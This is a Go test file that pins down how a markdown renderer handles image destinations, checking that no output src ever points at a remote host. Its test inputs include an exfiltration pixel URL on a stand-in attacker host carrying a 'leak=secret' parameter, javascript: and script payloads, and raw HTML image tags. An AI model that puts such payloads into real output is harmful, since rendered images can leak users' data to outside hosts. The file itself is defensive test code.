package webui

import (
	"bytes"
	"encoding/base64"
	"image"
	"image/color"
	"image/png"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// Images are the one part of markdown rendering where being wrong is a security
// bug rather than a typographic one, so the verdict for every kind of
// destination is pinned here. The invariant the whole file exists to protect:
// nothing that leaves this renderer ever points at a host.

// pngBytes is a real PNG, because the rule sniffs magic numbers rather than
// trusting an extension - a test using fake bytes would not exercise it.
func pngBytes(t *testing.T) []byte {
	t.Helper()
	img := image.NewRGBA(image.Rect(0, 0, 2, 2))
	img.Set(0, 0, color.RGBA{R: 200, G: 40, B: 90, A: 255})
	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		t.Fatalf("encode png: %v", err)
	}
	return buf.Bytes()
}

func writeFile(t *testing.T, name string, data []byte) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), name)
	if err := os.WriteFile(path, data, 0o644); err != nil {
		t.Fatalf("write %s: %v", name, err)
	}
	return path
}

func TestImageInlinesALocalFile(t *testing.T) {
	path := writeFile(t, "plot.png", pngBytes(t))
	got := RenderMarkdown("![a plot](" + path + ")")

	if !strings.Contains(got, `<img class="k-img"`) {
		t.Fatalf("a local PNG should render:\n%s", got)
	}
	if !strings.Contains(got, `src="data:image/png;base64,`) {
		t.Errorf("the bytes should be inlined, not the path:\n%s", got)
	}
	if strings.Contains(got, path) {
		t.Errorf("the surface must never learn the path:\n%s", got)
	}
	if !strings.Contains(got, `alt="a plot"`) {
		t.Errorf("the alt text was lost:\n%s", got)
	}
}

func TestImageKeepsTheTitle(t *testing.T) {
	path := writeFile(t, "plot.png", pngBytes(t))
	got := RenderMarkdown(`![alt](` + path + ` "throughput by hour")`)
	if !strings.Contains(got, `title="throughput by hour"`) {
		t.Errorf("the markdown title should become the tooltip:\n%s", got)
	}
}

func TestImageBlocksRemote(t *testing.T) {
	cases := map[string]string{
		"https":                                "https://evil.example/p.gif?leak=secret",
		"http":                                 "http://evil.example/p.gif",
		"protocol-relative":                    "//evil.example/p.gif",
		"a scheme agentbox has never heard of": "gopher://evil.example/p.gif",
		"javascript":                           "javascript:alert(1)",
	}
	for name, dest := range cases {
		got := RenderMarkdown("![pixel](" + dest + ")")
		if !strings.Contains(got, `data-reason="remote"`) {
			t.Errorf("%s should be refused as remote:\n%s", name, got)
		}
		if strings.Contains(got, "<img") {
			t.Errorf("%s produced an <img>:\n%s", name, got)
		}
		if strings.Contains(got, "src=") {
			t.Errorf("%s produced a src:\n%s", name, got)
		}
	}
}

// TestImageNeverEmitsARemoteSrc is the invariant, stated once over everything a
// destination might be. If this fails, rendering an agent's prose makes a request
// on its behalf.
func TestImageNeverEmitsARemoteSrc(t *testing.T) {
	path := writeFile(t, "ok.png", pngBytes(t))
	src := strings.Join([]string{
		"![a](https://evil.example/a.gif)",
		"![b](//evil.example/b.gif)",
		"![c](ftp://evil.example/c.gif)",
		"![d](" + path + ")",
		"![e](relative/e.png)",
		"![f](data:image/png;base64," + base64.StdEncoding.EncodeToString(pngBytes(t)) + ")",
	}, "\n\n")

	// Both ways in: agent prose with no base, and a document that has one. A base
	// resolves paths and must not widen what a src may be.
	for _, got := range []string{RenderMarkdown(src), RenderMarkdownIn(src, filepath.Dir(path))} {
		// The destination is allowed to appear in a title attribute - that is where a
		// blocked placeholder keeps it. What may never appear is a src pointing at it.
		for _, bad := range []string{`src="http`, `src="//`, `src="ftp`, `src="` + path, `src="relative`} {
			if strings.Contains(got, bad) {
				t.Fatalf("found %q in the output:\n%s", bad, got)
			}
		}
		// Every src that does exist is a data: URI.
		for rest := got; ; {
			i := strings.Index(rest, `src="`)
			if i < 0 {
				break
			}
			rest = rest[i+5:]
			if !strings.HasPrefix(rest, "data:image/") {
				t.Fatalf("a src that is not an inlined image:\n%s", rest[:min(40, len(rest))])
			}
		}
	}
}

func TestImageBlocksRelative(t *testing.T) {
	got := RenderMarkdown("![chart](out/chart.png)")
	if !strings.Contains(got, `data-reason="relative"`) {
		t.Fatalf("a relative path has no honest base here:\n%s", got)
	}
	if !strings.Contains(got, "needs an absolute path") {
		t.Errorf("the reader should be told what to fix:\n%s", got)
	}
	if !strings.Contains(got, "chart") {
		t.Errorf("the alt text should survive:\n%s", got)
	}
}

// A document that is a file on disk does have a base, and these pin what it may
// and may not change. The rule under test: resolving a relative path adds a way to
// name a file, never a way to reach one that an absolute path could not already.
func TestImageResolvesAgainstTheDocumentDirectory(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "plot.png"), pngBytes(t), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(dir, "out"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "out", "chart.png"), pngBytes(t), 0o644); err != nil {
		t.Fatal(err)
	}

	for name, dest := range map[string]string{
		"beside the document": "plot.png",
		"in a subdirectory":   "out/chart.png",
		"explicitly here":     "./plot.png",
		"up and back down":    "out/../plot.png",
	} {
		got := RenderMarkdownIn("![a plot]("+dest+")", dir)
		if !strings.Contains(got, `src="data:image/png;base64,`) {
			t.Errorf("%s (%s) should inline:\n%s", name, dest, got)
		}
		if strings.Contains(got, dir) {
			t.Errorf("%s: the surface must never learn the path:\n%s", name, got)
		}
	}
}

func TestImageBaseKeepsThePercentEscape(t *testing.T) {
	// `%20` is how a path with a space in it survives markdown; joining must not
	// eat the escape before the unescape downstream sees it.
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "my plot.png"), pngBytes(t), 0o644); err != nil {
		t.Fatal(err)
	}
	got := RenderMarkdownIn("![x](my%20plot.png)", dir)
	if !strings.Contains(got, `src="data:image/png;base64,`) {
		t.Errorf("an escaped space should still find the file:\n%s", got)
	}
}

func TestImageBaseDoesNotRescueWhatTheRuleRefuses(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "p.gif"), []byte("this is prose"), 0o644); err != nil {
		t.Fatal(err)
	}

	cases := map[string]struct{ dest, reason string }{
		"a remote host":              {"https://evil.example/p.gif", "remote"},
		"protocol-relative":          {"//evil.example/p.gif", "remote"},
		"a scheme, base or no base":  {"gopher://evil.example/p.gif", "remote"},
		"a relative file not there":  {"out/nope.png", "missing"},
		"a relative lie about bytes": {"p.gif", "not-an-image"},
	}
	for name, c := range cases {
		got := RenderMarkdownIn("![alt]("+c.dest+")", dir)
		if !strings.Contains(got, `data-reason="`+c.reason+`"`) {
			t.Errorf("%s should still be %q:\n%s", name, c.reason, got)
		}
		if strings.Contains(got, "<img") {
			t.Errorf("%s produced an <img>:\n%s", name, got)
		}
	}
}

func TestImageBaseChangesTheReasonNotTheVerdict(t *testing.T) {
	// With a base, a relative path that finds nothing is missing rather than
	// unresolvable, and the placeholder names where agentbox looked - which is the
	// question somebody debugging is actually asking.
	dir := t.TempDir()
	got := RenderMarkdownIn("![chart](out/chart.png)", dir)
	if !strings.Contains(got, `data-reason="missing"`) {
		t.Fatalf("a resolved path that is not there is missing:\n%s", got)
	}
	if !strings.Contains(got, `title="`+filepath.Join(dir, "out/chart.png")+`"`) {
		t.Errorf("the placeholder should name the path it tried:\n%s", got)
	}
}

func TestImageBaseMustBeAbsolute(t *testing.T) {
	// A relative base would produce a relative path, so it is ignored rather than
	// silently resolved against whatever directory the daemon happens to be in.
	got := RenderMarkdownIn("![chart](out/chart.png)", "docs")
	if !strings.Contains(got, `data-reason="relative"`) {
		t.Fatalf("a relative base is not a base:\n%s", got)
	}
}

func TestImageWithoutABaseIsUnchanged(t *testing.T) {
	// The same markdown, rendered the way everything on the socket is rendered.
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "plot.png"), pngBytes(t), 0o644); err != nil {
		t.Fatal(err)
	}
	if got := RenderMarkdown("![x](plot.png)"); !strings.Contains(got, `data-reason="relative"`) {
		t.Fatalf("agent prose has no base and must not acquire one:\n%s", got)
	}
}

func TestImageExpandsTilde(t *testing.T) {
	// Not "relative": a `~` path is absolute once expanded, and the verdict proves
	// the expansion happened without this test writing into anyone's home.
	got := RenderMarkdown("![x](~/agentbox-test-no-such-file.png)")
	if !strings.Contains(got, `data-reason="missing"`) {
		t.Fatalf("`~` should expand and then be looked for:\n%s", got)
	}
}

func TestImageVerdicts(t *testing.T) {
	dir := t.TempDir()
	text := filepath.Join(dir, "notes.png") // a lie in the extension
	if err := os.WriteFile(text, []byte("this is prose, not pixels"), 0o644); err != nil {
		t.Fatal(err)
	}
	big := filepath.Join(dir, "huge.png")
	if err := os.WriteFile(big, bytes.Repeat([]byte{0x89}, maxImageBytes+1), 0o644); err != nil {
		t.Fatal(err)
	}

	cases := map[string]struct{ dest, reason string }{
		"a file that is not there": {filepath.Join(dir, "nope.png"), "missing"},
		"prose wearing .png":       {text, "not-an-image"},
		"over the ceiling":         {big, "too-big"},
		"a directory":              {dir, "not-an-image"},
		"an empty destination":     {"<>", "missing"},
	}
	for name, c := range cases {
		got := RenderMarkdown("![alt](" + c.dest + ")")
		if !strings.Contains(got, `data-reason="`+c.reason+`"`) {
			t.Errorf("%s should be %q:\n%s", name, c.reason, got)
		}
	}
}

func TestImageAcceptsEveryFormatItClaimsTo(t *testing.T) {
	// GIF and WebP by their magic numbers; PNG and JPEG through the encoders.
	gif := append([]byte("GIF89a"), bytes.Repeat([]byte{0}, 32)...)
	webp := append([]byte("RIFF\x00\x00\x00\x00WEBPVP8 "), bytes.Repeat([]byte{0}, 24)...)

	for name, data := range map[string][]byte{"png": pngBytes(t), "gif": gif, "webp": webp} {
		path := writeFile(t, "pic-"+name, data)
		got := RenderMarkdown("![x](" + path + ")")
		if !strings.Contains(got, `<img class="k-img"`) {
			t.Errorf("%s should be accepted:\n%s", name, got)
		}
	}
}

func TestImageDataURI(t *testing.T) {
	good := "data:image/png;base64," + base64.StdEncoding.EncodeToString(pngBytes(t))
	if got := RenderMarkdown("![x](" + good + ")"); !strings.Contains(got, `src="data:image/png;base64,`) {
		t.Errorf("a well-formed data: URI should pass:\n%s", got)
	}

	// The mime an agent claims is not evidence either: the payload is sniffed.
	lying := "data:image/png;base64," + base64.StdEncoding.EncodeToString([]byte("<script>alert(1)</script>"))
	got := RenderMarkdown("![x](" + lying + ")")
	if !strings.Contains(got, `data-reason="not-an-image"`) {
		t.Fatalf("a data: URI whose payload is not an image should be refused:\n%s", got)
	}
	if strings.Contains(got, "<script>") {
		t.Errorf("the payload reached the document:\n%s", got)
	}

	oversize := "data:image/png;base64," + base64.StdEncoding.EncodeToString(bytes.Repeat([]byte{0x89}, maxImageBytes+1))
	if got := RenderMarkdown("![x](" + oversize + ")"); !strings.Contains(got, `data-reason="too-big"`) {
		t.Errorf("the ceiling applies to data: URIs too:\n%s", got)
	}
}

func TestImageBlockedPlaceholderDoesNotLeakIntoTheProse(t *testing.T) {
	// The destination belongs in the title attribute, where somebody debugging can
	// find it, and nowhere a sentence would read it as words.
	got := RenderMarkdown("![alt](https://evil.example/x.gif)")
	if !strings.Contains(got, `title="https://evil.example/x.gif"`) {
		t.Errorf("the destination should be recoverable:\n%s", got)
	}
	between := got[strings.Index(got, "</svg>"):]
	if strings.Contains(between, "evil.example") {
		t.Errorf("the destination leaked into the visible text:\n%s", got)
	}
}

func TestImageCacheFollowsTheFile(t *testing.T) {
	// encodeTurns re-renders every turn on every stream push, so inlining is
	// cached - but `agentbox show --watch` on a document whose image was just
	// regenerated has to show the new picture.
	path := writeFile(t, "live.png", pngBytes(t))
	first := RenderMarkdown("![x](" + path + ")")
	if first != RenderMarkdown("![x]("+path+")") {
		t.Fatalf("the same file should encode identically")
	}

	other := image.NewRGBA(image.Rect(0, 0, 4, 4))
	other.Set(1, 1, color.RGBA{R: 10, G: 200, B: 30, A: 255})
	var buf bytes.Buffer
	if err := png.Encode(&buf, other); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, buf.Bytes(), 0o644); err != nil {
		t.Fatal(err)
	}
	// Make the change visible even on a filesystem with coarse timestamps.
	future := time.Now().Add(2 * time.Second)
	if err := os.Chtimes(path, future, future); err != nil {
		t.Fatal(err)
	}

	if second := RenderMarkdown("![x](" + path + ")"); second == first {
		t.Errorf("a regenerated image should not serve the cached encoding")
	}
}

func TestImageRawHTMLStillNeverArrives(t *testing.T) {
	// The other half of the rule, and the reason `![]()` was the only hole: raw
	// HTML is dropped before any of this runs.
	got := RenderMarkdown(`<img src="https://evil.example/p.gif">`)
	if strings.Contains(got, "evil.example") {
		t.Fatalf("raw HTML reached the surface:\n%s", got)
	}
}
